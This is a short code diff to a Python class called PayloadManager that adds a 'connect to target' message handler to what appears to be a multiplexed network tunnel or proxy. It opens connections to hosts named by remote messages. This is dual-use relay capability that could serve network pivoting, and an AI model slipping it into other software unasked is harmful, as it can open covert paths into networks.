@@ -33,6 +33,25 @@ class PayloadManager:
                 await self.SendDisconnectHeader(data['chID'])
         
 
+        if data['type'] == 4: # Connect to target
+            port = int.from_bytes(data['data'][:2],'big')
+            host = data['data'][3:]
+            
+            ip = ''
+            print(host,port)
+            try:
+                ip = socket.gethostbyname(host.decode())
+            except:
+                pass
+
+            conn = await self.ConnectToTarget(ip,port,data['chID'])
+            if conn is not None:
+                self.client_list[data['chID']] = conn
+                self.TaskList[data['chID']] = asyncio.create_task(self.HandleClient(data['chID']))
+            else:
+                await self.SendDisconnectHeader(data['chID'])
+        
+
         elif data['type'] == 2:
             if data['chID'] in self.client_list:
                 self.client_list[data['chID']][1].write(data['data'])
